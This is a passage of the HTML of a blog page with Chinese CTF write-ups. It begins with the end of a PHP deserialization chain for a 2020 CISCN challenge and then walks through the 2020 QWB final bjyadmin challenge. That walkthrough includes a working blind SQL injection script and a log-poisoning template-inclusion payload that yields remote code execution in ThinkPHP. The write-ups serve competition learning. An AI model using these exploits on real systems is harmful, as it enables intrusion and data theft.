class="title">server</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">F3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> DB\Jig();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> DB\Jig\Mapper(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> F3(<span class="keyword">array</span>(<span class="string">&#x27;disconnect&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$b</span>, <span class="string">&quot;insert&quot;</span>)));</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> CLI\Agent(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> CLI\WS(<span class="variable">$d</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="cku89gxsu0004wvose1it1qjr" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-QWB-final-bjyadmin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020-QWB-final-bjyadmin/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.627Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-QWB-final-bjyadmin"><a href="#2020-QWB-final-bjyadmin" class="headerlink" title="2020-QWB-final-bjyadmin"></a>2020-QWB-final-bjyadmin</h1><h2 id="第一步sql注入"><a href="#第一步sql注入" class="headerlink" title="第一步sql注入"></a>第一步sql注入</h2><blockquote>
<p>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># mysql&gt; select info from PROCESSLIST;</span><br><span class="line"># +------------------------------+</span><br><span class="line"># | info                         |</span><br><span class="line"># +------------------------------+</span><br><span class="line"># | select info from PROCESSLIST |</span><br><span class="line"># +------------------------------+</span><br><span class="line"># 1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>利用processlist注出字段名，<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html">相关的介绍</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ip=<span class="string">&quot;192.168.10.110&quot;</span></span><br><span class="line"><span class="comment">#http://101.133.129.243/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inj</span>(<span class="params">pos,guess</span>):</span></span><br><span class="line">    <span class="comment"># true: real-guess &lt; 0</span></span><br><span class="line">    <span class="comment"># false : guess &lt;= real</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;/?id=1&#x27;/(if(floor((SELECT(ord(right(left(group_concat(info),&#123;POS&#125;),1)))FROM(information_schema.PROCESSLIST))/&#123;GUESS&#125;),1,0))/&#x27;1&quot;</span>.<span class="built_in">format</span>(POS=pos,GUESS=guess)</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    r=requests.get(burp0_url, headers=burp0_headers,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Undefined variable: rows in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># &quot;http://101.133.129.243:80/?id=1&#x27;/(if(floor((SELECT(ord(right(left(group_concat(schema_name),&#123;POS&#125;),1)))FROM(information_schema.schemata))/&#123;GUESS&#125;),1,0))/&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># database:2020qwbctf </span></span><br><span class="line"><span class="comment"># table_name:</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">pos=<span class="built_in">len</span>(result)+<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">        </span><br><span class="line">        avr = <span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(avr)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> inj(pos,avr):</span><br><span class="line">            <span class="keyword">if</span> inj(pos,avr+<span class="number">1</span>):</span><br><span class="line">                result+=<span class="built_in">chr</span>(avr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span>=avr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=avr</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>-<span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> inj(pos,<span class="built_in">min</span>):</span><br><span class="line">                result+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    pos+=<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="bjyadmin"><a href="#bjyadmin" class="headerlink" title="bjyadmin"></a>bjyadmin</h2><p>题目提供的附件和</p>
<p><a target="_blank" rel="noopener" href="https://github.com/baijunyao/thinkphp-bjyadmin">https://github.com/baijunyao/thinkphp-bjyadmin</a></p>
<p>一摸一样</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png" alt="image2362"></p>
<p>挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Common</span>\<span class="title">Controller</span>\<span class="title">HomeBaseController</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Vue示例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VueController</span> <span class="keyword">extends</span> <span class="title">HomeBaseController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 拦截空方法 自动加载html</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $methed_name 空方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_empty</span>(<span class="params"><span class="variable">$methed_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;display(<span class="variable">$methed_name</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配合thinkphp分页示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">page</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 获取总条数</span></span><br><span class="line">        <span class="variable">$count</span>=M(<span class="string">&#x27;Province_city_area&#x27;</span>)-&gt;count();</span><br><span class="line">        <span class="comment">// 每页多少条数据</span></span><br><span class="line">        <span class="variable">$limit</span>=<span class="number">200</span>;</span><br><span class="line">        <span class="variable">$page</span>=<span class="keyword">new</span> \Org\Nx\Page(<span class="variable">$count</span>,<span class="variable">$limit</span>);</span><br><span class="line">        <span class="variable">$data</span>=M(<span class="string">&#x27;Province_city_area&#x27;</span>)</span><br><span class="line">            -&gt;limit(<span class="variable">$page</span>-&gt;firstRow.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$page</span>-&gt;listRows)</span><br><span class="line">            -&gt;select();</span><br><span class="line">        <span class="keyword">echo</span> json_encode(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<h1 id="ThinkPHP-Action中的-empty方法"><a href="#ThinkPHP-Action中的-empty方法" class="headerlink" title="ThinkPHP Action中的_empty方法"></a>ThinkPHP Action中的_empty方法</h1><p>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;public function _empty($name)</span><br><span class="line">&gt;&#123;</span><br><span class="line">   echo $name;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>参数name,即请求的方法名。如<a target="_blank" rel="noopener" href="http://localhost/waimai/index.php/Index/sdfewsdf,%E4%B8%8D%E5%AD%98%E5%9C%A8sdfewsdf%E6%96%B9%E6%B3%95%E6%97%B6%EF%BC%8C%E4%BC%9A%E8%B0%83%E7%94%A8_empty%E6%96%B9%E6%B3%95%EF%BC%8C%E6%98%BE%E7%A4%BAsdfewsdf">http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf</a>.</p>
</blockquote>
<p>当我们调用一个不存在的action时，它会<code>display ($method) </code> ，这将会造成任意模板调用</p>
<p>我们利用<code>index.php?m=Home&amp;c=Vue&amp;a=evil_path</code>来调用任意模板，我们可以利用日志文件作为模板文件从而RCE</p>
<p>最后的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php/Home.php?m=Home&amp;c=Vue&amp;a=Runtime/Logs/User/20_09_17.log</span><br><span class="line">index.php/Home/Vue/web_page&amp;content=&lt;?php/**/phpinfo();</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020-QWB-final-bjyadmin/" data-id="cku89gxsv0005wvosbmv052yk" data-title="2020-QWB-final-bjyadmin" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/roarctf2019/">roarctf2019</a>
          </li>
        
          <li>
            <a href="/2021/10/01/sctf2020/">sctf2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/tctf2020/">tctf2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>